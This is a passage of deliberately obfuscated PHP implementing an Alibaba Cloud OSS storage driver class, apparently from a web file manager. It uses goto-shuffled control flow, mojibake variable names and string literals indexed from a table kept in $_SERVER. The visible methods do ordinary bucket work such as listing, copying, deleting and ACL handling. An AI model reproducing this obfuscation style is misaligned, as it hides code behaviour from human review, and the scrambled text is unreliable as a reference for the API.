. $c√ËÏÌáﬁà[0] . $d√‰€–Ô∆æ[50]; } } return $d‚Õ…àÎêÙ; } } goto a≠ñ”êûëô; E◊÷Íà¬‘⁄: class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\x30"; public $cdnHost = ''; public function __construct($c≤€òäÇÒ≈) { parent::__construct(); include_once SDK_DIR . $_SERVER[Öíæ€“”≠éÏË][1271]; $this->_init($c≤€òäÇÒ≈); } public function _init($Aüì®≥≈‡™) { $f®‡Ÿ€ÓÎ∑ =& $_SERVER[Öíæ€“”≠éÏË]; foreach ($Aüì®≥≈‡™ as $bèË≥´áÑ† => $b–„∆ùÈî©) { if (isset($this->{$bèË≥´áÑ†})) { $this->{$bèË≥´áÑ†} = $b–„∆ùÈî©; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($f®‡Ÿ€ÓÎ∑[1272] . LNG($f®‡Ÿ€ÓÎ∑[1273])); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { goto báº¿õ¬‡Ó; FøèªŒ·ñ›: $AÇ®ÂÜãÀ£->addRule($Bí≠Üâ∑‰Ñ); try { $this->client->putBucketCors($this->bucket, $AÇ®ÂÜãÀ£); } catch (OSS\Core\OssException $bÌœ¨Éƒ÷) { return !1; } return !0; goto Cüå¬Ø‡ùò; EÊòñëı”ì: $Bí≠Üâ∑‰Ñ->setMaxAgeSeconds(600); $Bí≠Üâ∑‰Ñ->addExposeHeader($Añíˆ“≠°Ê[1279]); $Bí≠Üâ∑‰Ñ->addAllowedHeader($Añíˆ“≠°Ê[1274]); goto FøèªŒ·ñ›; AÒ˜‰∑¬›Ç: $Bí≠Üâ∑‰Ñ->addAllowedMethod($Añíˆ“≠°Ê[1277]); $Bí≠Üâ∑‰Ñ->addAllowedMethod($Añíˆ“≠°Ê[1278]); $Bí≠Üâ∑‰Ñ->addAllowedMethod($Añíˆ“≠°Ê[158]); goto EÊòñëı”ì; báº¿õ¬‡Ó: $Añíˆ“≠°Ê =& $_SERVER[Öíæ€“”≠éÏË]; $AÇ®ÂÜãÀ£ = new OSS\Model\CorsConfig(); $Bí≠Üâ∑‰Ñ = new OSS\Model\CorsRule(); goto fÁ∂©á‡ç°; fÁ∂©á‡ç°: $Bí≠Üâ∑‰Ñ->addAllowedOrigin($Añíˆ“≠°Ê[1274]); $Bí≠Üâ∑‰Ñ->addAllowedMethod($Añíˆ“≠°Ê[1275]); $Bí≠Üâ∑‰Ñ->addAllowedMethod($Añíˆ“≠°Ê[1276]); goto AÒ˜‰∑¬›Ç; Cüå¬Ø‡ùò: } public function getBucketCors() { goto B÷ÑﬁÒ‹‚ù; FˆÖ⁄∆ËÊ°: $cπÜû“Ã«¿ = $E®≠Óè©…é[0]->getMaxAgeSeconds(); $f◊Ñ∑ú©Õ⁄ = $E®≠Óè©…é[0]->getExposeHeaders(); $EÒüåºƒäπ = $E®≠Óè©…é[0]->getAllowedHeaders(); goto B÷¬ÈÇäôø; B÷¬ÈÇäôø: return array($a‘ì∑∆Œ∏[181] => isset($B∞ëãÇ°Ôÿ[0]) ? $B∞ëãÇ°Ôÿ[0] : $a‘ì∑∆Œ∏[33], $a‘ì∑∆Œ∏[185] => $EˆÕ˜Ëåä†, $a‘ì∑∆Œ∏[1280] => $cπÜû“Ã«¿, $a‘ì∑∆Œ∏[1281] => isset($f◊Ñ∑ú©Õ⁄[0]) ? $f◊Ñ∑ú©Õ⁄[0] : $a‘ì∑∆Œ∏[33], $a‘ì∑∆Œ∏[183] => isset($EÒüåºƒäπ[0]) ? $EÒüåºƒäπ[0] : $a‘ì∑∆Œ∏[33]); goto e®÷·™úãÍ; B÷ÑﬁÒ‹‚ù: $a‘ì∑∆Œ∏ =& $_SERVER[Öíæ€“”≠éÏË]; $C‚ÀÒµï„„ = null; try { $C‚ÀÒµï„„ = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $A¿ö·•ÕÆŸ) { return null; } goto eãè¥úüëÁ; eãè¥úüëÁ: if (!$C‚ÀÒµï„„ || !($E®≠Óè©…é = $C‚ÀÒµï„„->getRules())) { return null; } $B∞ëãÇ°Ôÿ = $E®≠Óè©…é[0]->getAllowedOrigins(); $EˆÕ˜Ëåä† = $E®≠Óè©…é[0]->getAllowedMethods(); goto FˆÖ⁄∆ËÊ°; e®÷·™úãÍ: } public function isBucketCors() { goto AÃñåˆ˜Ì¬; C∂÷¨•áÍÙ: if ($dç®€‚›ﬂ∑[$eö§àëûÜ›[181]] != $eö§àëûÜ›[182] || $dç®€‚›ﬂ∑[$eö§àëûÜ›[183]] != $eö§àëûÜ›[182]) { return !1; } $E÷ùûäÛ¡Ô = array_map($eö§àëûÜ›[184], $dç®€‚›ﬂ∑[$eö§àëûÜ›[185]]); if (!is_array($E÷ùûäÛ¡Ô)) { $E÷ùûäÛ¡Ô = array(); } goto Bå†Ωﬂø˜à; AÃñåˆ˜Ì¬: $eö§àëûÜ› =& $_SERVER[Öíæ€“”≠éÏË]; $dç®€‚›ﬂ∑ = $this->getBucketCors(); if (!$dç®€‚›ﬂ∑ || !is_array($dç®€‚›ﬂ∑)) { return !1; } goto C∂÷¨•áÍÙ; Bå†Ωﬂø˜à: $c „œõÎÕ≥ = array($eö§àëûÜ›[186], $eö§àëûÜ›[187], $eö§àëûÜ›[188], $eö§àëûÜ›[189], $eö§àëûÜ›[190]); $cÂÁ˜¯á∑⁄ = array_diff($c „œõÎÕ≥, $E÷ùûäÛ¡Ô); return empty($cÂÁ˜¯á∑⁄); goto c€ãÑõÑåﬁ; c€ãÑõÑåﬁ: } public function mkfile($fò Ñ¬‚ÇØ, $Dïç¨´ÂÇß = '', $díÙπçÑÉ… = REPEAT_RENAME) { $Eç«Ë∂êùŸ = $this->setContent($fò Ñ¬‚ÇØ, $Dïç¨´ÂÇß); if ($Eç«Ë∂êùŸ !== !1) { return $this->getPathOuter($fò Ñ¬‚ÇØ); } return !1; } public function mkdir($b‡óú≈Õáâ, $FèÆß√Ü∫È = REPEAT_SKIP) { if ($this->_isFolder($b‡óú≈Õáâ)) { return $this->getPathOuter($b‡óú≈Õáâ); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($b‡óú≈Õáâ)); } catch (OSS\Core\OssException $Fﬁ£âí£ä ) { return !1; } return $this->getPathOuter($b‡óú≈Õáâ); } private function fileList($fËáû∏æ‚Ì, $c©ππÚÀ›≥ = '', $d»¯ﬁÆ°é¨ = 0) { goto AáâÈØ∏∫§; c˜çÀÉ≤•Í: return array($C‚ãèö†§[75] => $CÑÖÜÇƒ¿ã, $C‚ãèö†§[74] => $d–¿ﬂõﬂÛ∆); goto D’ˆëËïòã; E§íÒ∆µ•œ: $c„—•ŒÂ±À = $C‚ãèö†§[33]; $A‰ﬁõÎé√€ = 1000; $Fª¯à◊ı•Ú = $this->listItemCache === !1 ? !1 : !0; goto C”ÍÜàÑî¥; AáâÈØ∏∫§: $C‚ãèö†§ =& $_SERVER[Öíæ€“”≠éÏË]; $fËáû∏æ‚Ì = trim($fËáû∏æ‚Ì, $C‚ãèö†§[8]); $füèÉÒé¢Ì = empty($fËáû∏æ‚Ì) && $fËáû∏æ‚Ì !== $C‚ãèö†§[191] ? $C‚ãèö†§[33] : $fËáû∏æ‚Ì . $C‚ãèö†§[8]; goto E§íÒ∆µ•œ; C”ÍÜàÑî¥: $CÑÖÜÇƒ¿ã = $d–¿ﬂõﬂÛ∆ = array(); while (!0) { check_abort(); $E›÷±ÃŸë≈ = array($C‚ãèö†§[1282] => $c©ππÚÀ›≥, $C‚ãèö†§[1283] => $füèÉÒé¢Ì, $C‚ãèö†§[1284] => $A‰ﬁõÎé√€, $C‚ãèö†§[1285] => $c„—•ŒÂ±À); try { $fÕ∂î∞ŒÁØ = $this->client->listObjects($this->bucket, $E›÷±ÃŸë≈); } catch (OSS\Core\OssException $d∆∆ë∞ùÍ¡) { break; } $c„—•ŒÂ±À = $fÕ∂î∞ŒÁØ->getNextMarker(); $aÉÇÜ‡ºó· = $fÕ∂î∞ŒÁØ->getObjectList(); $béÙÛî≥é„ = $fÕ∂î∞ŒÁØ->getPrefixList(); foreach ($aÉÇÜ‡ºó· as $Cì÷ÓÆíÁ¨) { goto aë≈»µµÁ¨; f›√ÿîÈ““: if ($Fª¯à◊ı•Ú) { $this->cacheMethod($C‚ãèö†§[199], $aÊ÷±ú©ÖÓ, $DäåôÆíÃ‹); $this->cacheMethod($C‚ãèö†§[200], $aÊ÷±ú©ÖÓ, array($C‚ãèö†§[78] => $dÆÈ¥ä∆…÷, $C‚ãèö†§[1286] => $dÆÈ¥ä∆…÷, $C‚ãèö†§[84] => strtotime($Bﬁ”ê‘Í›Œ), $C‚ãèö†§[1287] => $Bﬁ”ê‘Í›Œ)); } if ($DäåôÆíÃ‹) { $CÑÖÜÇƒ¿ã[] = $aÊ÷±ú©ÖÓ; continue; } $d–¿ﬂõﬂÛ∆[] = $A∞∂äãêÇ•; goto FäÃ˘‰ßÓ…; aë≈»µµÁ¨: if ($Cì÷ÓÆíÁ¨->getKey() == $füèÉÒé¢Ì) { continue; } $aÊ÷±ú©ÖÓ = $Cì÷ÓÆíÁ¨->getKey(); $dÆÈ¥ä∆…÷ = $Cì÷ÓÆíÁ¨->getSize(); goto d¯Ó„∑‘«‰; d¯Ó„∑‘«‰: $Bﬁ”ê‘Í›Œ = $Cì÷ÓÆíÁ¨->getLastModified(); $A∞∂äãêÇ• = $d»¯ﬁÆ°é¨ ? array($C‚ãèö†§[28] => $aÊ÷±ú©ÖÓ, $C‚ãèö†§[78] => $dÆÈ¥ä∆…÷, $C‚ãèö†§[197] => strtotime($Bﬁ”ê‘Í›Œ)) : $aÊ÷±ú©ÖÓ; $DäåôÆíÃ‹ = $dÆÈ¥ä∆…÷ == 0 && substr($aÊ÷±ú©ÖÓ, strlen($aÊ÷±ú©ÖÓ) - 1, 1) == $C‚ãèö†§[8] ? !0 : !1; goto f›√ÿîÈ““; FäÃ˘‰ßÓ…: } foreach ($béÙÛî≥é„ as $C¿·∂ ⁄†µ) { $CÑÖÜÇƒ¿ã[] = $C¿·∂ ⁄†µ->getPrefix(); if ($Fª¯à◊ı•Ú) { $this->cacheMethod($C‚ãèö†§[199], $aÊ÷±ú©ÖÓ, !0); } } if ($c„—•ŒÂ±À === $C‚ãèö†§[33]) { break; } } if ($Fª¯à◊ı•Ú) { $this->cacheMethod($C‚ãèö†§[199], $fËáû∏æ‚Ì, !0); } goto c˜çÀÉ≤•Í; D’ˆëËïòã: } public function copyFile($dº¡ﬂæê∫Ó, $A°éçâÔôı) { $C åêè¢»ª = $this->size($dº¡ﬂæê∫Ó); if ($C åêè¢»ª < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $dº¡ﬂæê∫Ó, $this->bucket, $this->pathEncode($A°éçâÔôı)); } catch (OSS\Core\OssException $b˘ÓÿŒñàÂ) { return !1; } return $this->getPathOuter($A°éçâÔôı); } $dﬂòÛªà¡ = $this->multiCopyObject($dº¡ﬂæê∫Ó, $A°éçâÔôı, $C åêè¢»ª); return $dﬂòÛªà¡ ? $this->getPathOuter($A°éçâÔôı) : !1; } private function multiCopyObject($DƒãËà√è‘, $DÇÓßû¨µ, $cœñÜÛÜ¡µ) { $B«„è±Œ©ƒ =& $_SERVER[Öíæ€“”≠éÏË]; try { goto a®ÖŸÇÁçè; a®ÖŸÇÁçè: $B„í®«‰øß = array(); if ($fŸâ∂ù¬¢ﬂ = $this->hashMd5($DƒãËà√è‘)) { $B„í®«‰øß = array(OSS\OssClient::OSS_HEADERS => array($B«„è±Œ©ƒ[1288] => $fŸâ∂ù¬¢ﬂ)); } $EÛØÍä¥ ã = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($DÇÓßû¨µ), $B„í®«‰øß); goto A‘––ßüçù; E®æ≤ˆÉÒâ: $c∞é‡õ›≤Î = 1024 * 1024 * 10; $bé®’‘≈ÊÙ = $this->client->generateMultiuploadParts($cœñÜÛÜ¡µ, $c∞é‡õ›≤Î); foreach ($bé®’‘≈ÊÙ as $D«Á˜ßÇ∆∑ => $CÜÆ€£ßÉÖ) { $a¶©é°éè⁄ = $b√ùë∂ïûé + (int) $CÜÆ€£ßÉÖ[$B«„è±Œ©ƒ[1289]]; $Cñ‹ﬂŒ≤∂≠ = (int) $CÜÆ€£ßÉÖ[$B«„è±Œ©ƒ[335]] + $a¶©é°éè⁄ - 1; $b®€û®¿‹“ = array($B«„è±Œ©ƒ[1290] => $a¶©é°éè⁄, $B«„è±Œ©ƒ[1291] => $Cñ‹ﬂŒ≤∂≠); $aêúìÆÜô[] = $this->client->uploadPartCopy($this->bucket, $DƒãËà√è‘, $this->bucket, $this->pathEncode($DÇÓßû¨µ), $F™‹ûôÛ‰ª, $EÛØÍä¥ ã, $b®€û®¿‹“); $F™‹ûôÛ‰ª = $F™‹ûôÛ‰ª + 1; } goto CËêÓ∑±ËÈ; A‘––ßüçù: $F™‹ûôÛ‰ª = 1; $b√ùë∂ïûé = 0; $aêúìÆÜô = array(); goto E®æ≤ˆÉÒâ; CËêÓ∑±ËÈ: $d´ãß‘ªà = array(); foreach ($aêúìÆÜô as $D«Á˜ßÇ∆∑ => $b÷äî¶◊§Â) { $d´ãß‘ªà[] = array($B«„è±Œ©ƒ[1292] => $D«Á˜ßÇ∆∑ + 1, $B«„è±Œ©ƒ[1293] => $b÷äî¶◊§Â); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($DÇÓßû¨µ), $EÛØÍä¥ ã, $d´ãß‘ªà); goto aŒÇ¡©ó∞Ñ; aŒÇ¡©ó∞Ñ: } catch (OSS\Core\OssException $bçÇü⁄ÇÏÖ) { return !1; } return !0; } public function moveFile($f˜®ˆı´Ù⁄, $bæõ®∫êÃ€) { if ($this->copyFile($f˜®ˆı´Ù⁄, $bæõ®∫êÃ€)) { $this->remove($f˜®ˆı´Ù⁄); return $this->getPathOuter($bæõ®∫êÃ€); } return !1; } public function delFile($F≤◊Á¿Âï‹) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($F≤◊Á¿Âï‹)); } catch (OSS\Core\OssException $B≠◊ áè˘ô) { return !1; } return !0; } public function delFolder($EæÿÏØ≠Ôº) { goto CíÎ ä¢ë∏; D€˜Û‡Á°è: $B∞îÁôà∞Ç = $this->delByBatch($F–◊Î¶Ë‹á[$Bâû•‡¡∏ô[75]]); if (!$B∞îÁôà∞Ç) { return !1; } return $this->delFile($bˆüäïõ‰); goto eìÆÀ®Ì’π; AÈ†ú÷Ì’¶: $F–◊Î¶Ë‹á = $this->fileList($EæÿÏØ≠Ôº); $this->listItemCache = !0; $bˆüäïõ‰ = trim($EæÿÏØ≠Ôº, $Bâû•‡¡∏ô[8]) . $Bâû•‡¡∏ô[8]; goto FÍÁÿ¬õß˘; FÍÁÿ¬õß˘: if (!empty($EæÿÏØ≠Ôº) && $EæÿÏØ≠Ôº !== $Bâû•‡¡∏ô[191] && !in_array($bˆüäïõ‰, $F–◊Î¶Ë‹á[$Bâû•‡¡∏ô[75]])) { $F–◊Î¶Ë‹á[$Bâû•‡¡∏ô[75]][] = $bˆüäïõ‰; } $B∞îÁôà∞Ç = $this->delByBatch($F–◊Î¶Ë‹á[$Bâû•‡¡∏ô[74]]); if (!$B∞îÁôà∞Ç) { return !1; } goto D€˜Û‡Á°è; CíÎ ä¢ë∏: $Bâû•‡¡∏ô =& $_SERVER[Öíæ€“”≠éÏË]; if (!$this->exist($EæÿÏØ≠Ôº)) { return !0; } $this->listItemCache = !1; goto AÈ†ú÷Ì’¶; eìÆÀ®Ì’π: } private function delByBatch($Cﬁ§ŒìÂÛ∞) { foreach (array_chunk($Cﬁ§ŒìÂÛ∞, 1000) as $d‰ÿ”“ÎÑë) { try { $this->client->deleteObjects($this->bucket, $d‰ÿ”“ÎÑë); } catch (OSS\Core\OssException $e«Óï¥•ˆñ) { return !1; } } return !0; } public function rename($AËÊâáﬁÎ®, $C“ºêå⁄·ˆ) { return $this->renameObject($AËÊâáﬁÎ®, $C“ºêå⁄·ˆ); } private function fileInfo($bÚù∞Óˆ Õ, $bï‹â¢«ØÚ = false, $F«é§Ò«ç» = array()) { goto b´Ω“›È€ñ; b´Ω“›È€ñ: $c€◊‚ìØäã =& $_SERVER[Öíæ€“”≠éÏË]; $e„çäµÙÉø = array($c€◊‚ìØäã[28] => $this->pathThis($bÚù∞Óˆ Õ), $c€◊‚ìØäã[76] => $this->getPathOuter($bÚù∞Óˆ Õ), $c€◊‚ìØäã[29] => $c€◊‚ìØäã[193], $c€◊‚ìØäã[78] => isset($F«é§Ò«ç»[$c€◊‚ìØäã[78]]) ? $F«é§Ò«ç»[$c€◊‚ìØäã[78]] : 0, $c€◊‚ìØäã[168] => $this->ext($bÚù∞Óˆ Õ)); if ($bï‹â¢«ØÚ) { return $e„çäµÙÉø; } goto B˜»¥ê´ãü; A–÷…„è‘é: return $e„çäµÙÉø; goto b⁄π∞Í—®Ù; dö«Ω¯ı∫º: if (isset($F«é§Ò«ç»[$c€◊‚ìØäã[78]])) { $e„çäµÙÉø[$c€◊‚ìØäã[78]] = $F«é§Ò«ç»[$c€◊‚ìØäã[78]]; } if (isset($F«é§Ò«ç»[$c€◊‚ìØäã[84]])) { $e„çäµÙÉø[$c€◊‚ìØäã[84]] = $F«é§Ò«ç»[$c€◊‚ìØäã[84]]; } if (isset($F«é§Ò«ç»[$c€◊‚ìØäã[197]]) && !trim($e„çäµÙÉø[$c€◊‚ìØäã[84]])) { $e„çäµÙÉø[$c€◊‚ìØäã[84]] = $F«é§Ò«ç»[$c€◊‚ìØäã[197]]; } goto A–÷…„è‘é; B˜»¥ê´ãü: $e„çäµÙÉø[$c€◊‚ìØäã[194]] = $e„çäµÙÉø[$c€◊‚ìØäã[84]] = 0; $e„çäµÙÉø[$c€◊‚ìØäã[195]] = $e„çäµÙÉø[$c€◊‚ìØäã[196]] = !0; if (empty($F«é§Ò«ç»)) { $cÕâÕÈá›ó = $this->objectMeta($bÚù∞Óˆ Õ); if (!$cÕâÕÈá›ó) { return $e„çäµÙÉø; } $F«é§Ò«ç» = array($c€◊‚ìØäã[84] => strtotime($cÕâÕÈá›ó[$c€◊‚ìØäã[1287]]), $c€◊‚ìØäã[78] => $cÕâÕÈá›ó[$c€◊‚ìØäã[1286]] + 0); } goto dö«Ω¯ı∫º; b⁄π∞Í—®Ù: } private function folderInfo($Aç¯ŸÍô⁄˜, $F†ÈíÈ†⁄† = false, $büÈªœÜöœ = array()) { goto fâ¶£º ¯ı; fâ¶£º ¯ı: $DÚ µ£ëœ∂ =& $_SERVER[Öíæ€“”≠éÏË]; $f√¡≈…Ëõ = array($DÚ µ£ëœ∂[28] => $this->pathThis($Aç¯ŸÍô⁄˜), $DÚ µ£ëœ∂[76] => $this->getPathOuter($DÚ µ£ëœ∂[8] . $Aç¯ŸÍô⁄˜), $DÚ µ£ëœ∂[29] => $DÚ µ£ëœ∂[77]); if ($F†ÈíÈ†⁄†) { return $f√¡≈…Ëõ; } goto d˜¡ö·æéµ; C∫À…øÁì∏: if (isset($büÈªœÜöœ[$DÚ µ£ëœ∂[84]])) { $f√¡≈…Ëõ[$DÚ µ£ëœ∂[84]] = $büÈªœÜöœ[$DÚ µ£ëœ∂[84]]; } if (isset($büÈªœÜöœ[$DÚ µ£ëœ∂[194]])) { $f√¡≈…Ëõ[$DÚ µ£ëœ∂[194]] = $büÈªœÜöœ[$DÚ µ£ëœ∂[194]]; } return $f√¡≈…Ëõ; goto Dö¥æ˘€«ê; d˜¡ö·æéµ: $f√¡≈…Ëõ[$DÚ µ£ëœ∂[194]] = $f√¡≈…Ëõ[$DÚ µ£ëœ∂[84]] = 0; $f√¡≈…Ëõ[$DÚ µ£ëœ∂[195]] = $f√¡≈…Ëõ[$DÚ µ£ëœ∂[196]] = !0; if (empty($büÈªœÜöœ)) { $Aç¯ŸÍô⁄˜ = rtrim($Aç¯ŸÍô⁄˜, $DÚ µ£ëœ∂[8]) . $DÚ µ£ëœ∂[8]; $dß âı÷©« = $this->objectMeta($Aç¯ŸÍô⁄˜); if (!$dß âı÷©«) { return $f√¡≈…Ëõ; } $büÈªœÜöœ = array($DÚ µ£ëœ∂[194] => $dß âı÷©«[$DÚ µ£ëœ∂[493]][$DÚ µ£ëœ∂[1294]], $DÚ µ£ëœ∂[84] => strtotime($dß âı÷©«[$DÚ µ£ëœ∂[1287]])); } goto C∫À…øÁì∏; Dö¥æ˘€«ê: } public function listPath($b≥ƒòÂ–÷Ò, $Bæù±°“Â‚ = false) { $eø∂†ëæ≈€ =& $_SERVER[Öíæ€“”≠éÏË]; $bÓØ§åÙ–è = $this->fileList($b≥ƒòÂ–÷Ò, $eø∂†ëæ≈€[8], !0); foreach ($bÓØ§åÙ–è[$eø∂†ëæ≈€[75]] as $DËò‡Óò¶Ú => $AïÑÂ√º≥∂) { $bÓØ§åÙ–è[$eø∂†ëæ≈€[75]][$DËò‡Óò¶Ú] = $this->folderInfo($AïÑÂ√º≥∂, $Bæù±°“Â‚, $AïÑÂ√º≥∂); } foreach ($bÓØ§åÙ–è[$eø∂†ëæ≈€[74]] as $DËò‡Óò¶Ú => $AïÑÂ√º≥∂) { $bÓØ§åÙ–è[$eø∂†ëæ≈€[74]][$DËò‡Óò¶Ú] = $this->fileInfo($AïÑÂ√º≥∂[$eø∂†ëæ≈€[28]], $Bæù±°“Â‚, $AïÑÂ√º≥∂); } return $bÓØ§åÙ–è; } public function has($dõÇÒ≠ﬂ«ﬁ, $bõ…Û˜éÍë = false, $F•‘Ë‡áûË = true) { goto D∂ÑâÈíË±; eÈØë¨ãƒÊ: $D‘”∫Ìí£É = $D¿ãÈ⁄ÒÉ[33]; $eïêπ∑Ò¿Ò = 500; $fÛÀè˘˜°Ò = $AÊØ⁄Ãôèæ = 0; goto eæ¨≤†´ãË; eæ¨≤†´ãË: while (!0) { check_abort(); $c£’¥äû∂ = array($D¿ãÈ⁄ÒÉ[1282] => $D¿ãÈ⁄ÒÉ[8], $D¿ãÈ⁄ÒÉ[1283] => $a…⁄≈Õ°ë›, $D¿ãÈ⁄ÒÉ[1284] => $eïêπ∑Ò¿Ò, $D¿ãÈ⁄ÒÉ[1285] => $D‘”∫Ìí£É); try { $D•‚ª»ÃË∫ = $this->client->listObjects($this->bucket, $c£’¥äû∂); } catch (OSS\Core\OssException $B·ÏüıÒÔ„) { break; } $D‘”∫Ìí£É = $D•‚ª»ÃË∫->getNextMarker(); $Cî¬¡åØ£Û = $D•‚ª»ÃË∫->getObjectList(); $C·øëç· „ = $D•‚ª»ÃË∫->getPrefixList(); if ($bõ…Û˜éÍë) { if (count($Cî¬¡åØ£Û) > 1 || count($Cî¬¡åØ£Û) == 1 && $Cî¬¡åØ£Û[0]->getKey() != $a…⁄≈Õ°ë›) { $fÛÀè˘˜°Ò += count($Cî¬¡åØ£Û) - 1; } if (!empty($C·øëç· „)) { $AÊØ⁄Ãôèæ += count($C·øëç· „); } if ($D‘”∫Ìí£É === $D¿ãÈ⁄ÒÉ[33]) { break; } continue; } if ($F•‘Ë‡áûË) { if (!empty($Cî¬¡åØ£Û)) { if (count($Cî¬¡åØ£Û) > 1 || $Cî¬¡åØ£Û[0]->getKey() != $a…⁄≈Õ°ë›) { return !0; } } } else { if (!empty($C·øëç· „)) { return !0; } } if ($D‘”∫Ìí£É === $D¿ãÈ⁄ÒÉ[33]) { break; } } if ($bõ…Û˜éÍë) { return array($D¿ãÈ⁄ÒÉ[203] => $fÛÀè˘˜°Ò, $D¿ãÈ⁄ÒÉ[204] => $AÊØ⁄Ãôèæ); } return !1; goto eÏèºÖ√©Í; D∂ÑâÈíË±: $D¿ãÈ⁄ÒÉ =& $_SERVER[Öíæ€“”≠éÏË]; $dõÇÒ≠ﬂ«ﬁ = trim($dõÇÒ≠ﬂ«ﬁ, $D¿ãÈ⁄ÒÉ[8]); $a…⁄≈Õ°ë› = empty($dõÇÒ≠ﬂ«ﬁ) && $dõÇÒ≠ﬂ«ﬁ !== $D¿ãÈ⁄ÒÉ[191] ? $D¿ãÈ⁄ÒÉ[33] : $dõÇÒ≠ﬂ«ﬁ . $D¿ãÈ⁄ÒÉ[8]; goto eÈØë¨ãƒÊ; eÏèºÖ√©Í: } public function listAll($AΩíè≥–®Ÿ) { $Cﬁå–ß√Ω… =& $_SERVER[Öíæ€“”≠éÏË]; $B¡í±Î»Ü… = $this->fileList($AΩíè≥–®Ÿ, $Cﬁå–ß√Ω…[33], !0); $B∂àŒÂ∞Øö = array(); foreach ($B¡í±Î»Ü…[$Cﬁå–ß√Ω…[74]] as $Eë®ø·§∆ô) { $B∂àŒÂ∞Øö[$Eë®ø·§∆ô[$Cﬁå–ß√Ω…[28]]] = $Eë®ø·§∆ô[$Cﬁå–ß√Ω…[78]]; } foreach ($B¡í±Î»Ü…[$Cﬁå–ß√Ω…[75]] as $Eë®ø·§∆ô) { if (is_string($Eë®ø·§∆ô)) { $B∂àŒÂ∞Øö[$Eë®ø·§∆ô] = 0; } } return $this->listAllFiles($AΩíè≥–®Ÿ, array_keys($B∂àŒÂ∞Øö), $B∂àŒÂ∞Øö); } public function canRead($Bß„òé·û®) { $E…¬πÑ›‘û =& $_SERVER[Öíæ€“”≠éÏË]; $fÆò∑±—ô¡ = $this->pathAcl($Bß„òé·û®); return $fÆò∑±—ô¡ == $E…¬πÑ›‘û[1295] || $fÆò∑±—ô¡ == $E…¬πÑ›‘û[533] ? !0 : !1; } public function canWrite($Bƒé•ÕáòÔ) { $FàΩ∫´Ô´˘ = $this->pathAcl($Bƒé•ÕáòÔ); return $FàΩ∫´Ô´˘ == $_SERVER[Öíæ€“”≠éÏË][533] ? !0 : !1; } public function pathAcl($Eﬁ√∏º¯Üø) { goto bûÑÜÂé≈Ø; D®§Ò÷◊ïó: $Aöí∫à¥ÌÙ = $BÕ∑Æª®’√ == $E”˜ŒÊ÷èç[34] ? $this->bucketAcl : $BÕ∑Æª®’√; if ($Aöí∫à¥ÌÙ == $E”˜ŒÊ÷èç[1296]) { return $E”˜ŒÊ÷èç[1295]; } if ($Aöí∫à¥ÌÙ == $E”˜ŒÊ÷èç[1297]) { return $E”˜ŒÊ÷èç[533]; } goto BÙÇ¶ãá∆…; bûÑÜÂé≈Ø: $E”˜ŒÊ÷èç =& $_SERVER[Öíæ€“”≠éÏË]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $BÕ∑Æª®’√ = $this->client->getObjectAcl($this->bucket, $this->pathEncode($Eﬁ√∏º¯Üø)); } catch (OSS\Core\OssException $aÕ∆àŒÜîµ) { return !1; } goto D®§Ò÷◊ïó; BÙÇ¶ãá∆…: return $Aöí∫à¥ÌÙ; goto dº·∫çïø; dº·∫çïø: } private function chmodPath($Eêµ≈Ñí“◊, $a≈ÀÿåŸ¯ = '') { $D≈á∫™ö§ó =& $_SERVER[Öíæ€“”≠éÏË]; $b≤öèå˘¥ﬁ = empty($a≈ÀÿåŸ¯) ? $D≈á∫™ö§ó[1297] : $a≈ÀÿåŸ¯; $a∫ Õï„æ∏ = array($D≈á∫™ö§ó[34], $D≈á∫™ö§ó[192], $D≈á∫™ö§ó[1296], $D≈á∫™ö§ó[1297]); if (!in_array($b≤öèå˘¥ﬁ, $a∫ Õï„æ∏)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($Eêµ≈Ñí“◊), $b≤öèå˘¥ﬁ); } catch (OSS\Core\OssException $Bºê•ÊÔã¯) { return !1; } return !0; } public function getContent($D’∏—«◊èù) { return $this->fileSubstr($D’∏—«◊èù, -1); } public function setContent($dŸÔåâ›œﬂ, $cãùø—Ç∞â = '') { $cëç›¬¯îÓ =& $_SERVER[Öíæ€“”≠éÏË]; try { $e÷¡¶ÈÌù = $this->trafficLimit($cëç›¬¯îÓ[1298]); $c£§çà∆·≥ = $this->client->putObject($this->bucket, $this->pathEncode($dŸÔåâ›œﬂ), $cãùø—Ç∞â, $e÷¡¶ÈÌù); } catch (OSS\Core\OssException $fœì•·¿ ˆ) { return !1; } $b“õ«Œ’∂â = array($cëç›¬¯îÓ[1288] => trim($c£§çà∆·≥[$cëç›¬¯îÓ[1299]], $cëç›¬¯îÓ[116]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($dŸÔåâ›œﬂ))); $this->updateObjMeta($dŸÔåâ›œﬂ, $b“õ«Œ’∂â); return isset($c£§çà∆·≥[$cëç›¬¯îÓ[1300]][$cëç›¬¯îÓ[1247]]) ? !0 : !1; } private function updateObjMeta($dÏ©†´˘∫Î, $Aÿç¶√ﬂﬁÌ) { $dÏ©†´˘∫Î = $this->pathEncode($dÏ©†´˘∫Î); try { $FÇåúë∏Ÿ¿ = array(OSS\OssClient::OSS_HEADERS => $Aÿç¶√ﬂﬁÌ); $this->client->copyObject($this->bucket, $dÏ©†´˘∫Î, $this->bucket, $dÏ©†´˘∫Î, $FÇåúë∏Ÿ¿); } catch (OSS\Core\OssException $CÏà≥øÑìˆ) { return !1; } return !0; } public function upload($BËÜÉ·’êç, $dêƒÒŸê·à, $a¬øØå•êÌ = false, $EπàˆÜàûõ = REPEAT_REPLACE) { $DªòºÖÏ£Ú =& $_SERVER[Öíæ€“”≠éÏË]; $cΩ‡î„ΩÌº = trim($BËÜÉ·’êç, $DªòºÖÏ£Ú[8]); $e∂–ﬁø§å‡ = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE 